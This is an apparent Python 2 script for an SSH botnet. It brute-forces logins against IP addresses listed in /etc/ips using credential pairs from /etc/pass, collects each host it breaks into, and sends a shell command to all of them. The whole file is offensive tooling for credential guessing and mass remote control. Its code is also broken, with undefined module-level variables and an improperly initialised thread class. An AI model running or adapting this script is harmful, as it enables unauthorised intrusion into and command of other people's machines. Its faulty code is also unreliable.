#!/usr/bin/python
import pxssh
from pexpect import *
import pexpect
import PySweeper
import sys
import time
import signal
from time import sleep
import threading

class Client(threading.Thread):
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            print_color("[+] Connection successful!", "green")
            return s
        except Exception, e:
            return None
            print_color("[-] Connection timed out.", "red")

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

class Botnet:
    def __init__(self):
        self.clients = []
        with open('/etc/ips') as f:
            self.ips = [x.strip() for x in f.readlines()]
        with open('/etc/pass') as f:
            self.credentials = [x.strip().split(':') for x in f.readlines()]

    def add_client(self, client):
        self.clients.append(client)


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print "[*] Output from " + client.host
        print output

def print_color(text, color):
    if color is "green":
        print("\033[92m" + text + "\033[0m")
    elif color is "red":
        print("\033[91m" + text + "\033[0m")
    elif color is "yellow":
        print("\033[93m" + text + "\033[0m")
    else:
        print(text + "\nColor not found!")

def login(ip, credentials):
    for user, passwd in credentials:
        try:
            result = Client(ip, user, passwd)
        except:
            result = None
        finally:
            if result.session is not None:
                botNet.append(result)
                break



threads = []

for ip in ips:
    t = threading.Thread(target=login, args=(ip, credentials))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print botNet

botnetCommand("ls -la")
